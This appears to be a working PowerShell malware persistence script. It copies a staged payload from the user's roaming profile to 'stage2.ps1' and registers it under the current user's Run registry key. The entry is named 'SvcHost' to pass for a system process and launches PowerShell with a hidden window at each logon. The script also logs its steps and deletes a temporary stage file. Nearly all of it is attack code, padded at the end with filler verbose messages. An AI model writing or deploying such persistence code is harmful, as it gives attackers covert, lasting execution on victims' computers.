<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = "SvcHost",
    [string]$PersistencePath = "$env:APPDATA\stage2.ps1",
    [string]$LogPath = "$env:TEMP\report.txt"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    param(
        [string]$SourcePath = "",
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    param(
        [string]$KeyPath = '',
        [string]$ValueName = "",
        [string]$TargetPath = ""
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $TargetPath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName -ErrorAction SilentlyContinue)
}

Write-StageLog -Message "Starting persistence stage"
$InstallResult = Install-StagePayload -SourcePath "$env:APPDATA\payload.bin" -DestinationPath $PersistencePath
if ($InstallResult) {
    $FetchResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
    Write-StageLog -Message "Run key written"
}
else {
    Write-Warning "Payload copy did not complete"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Starting workflow"
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
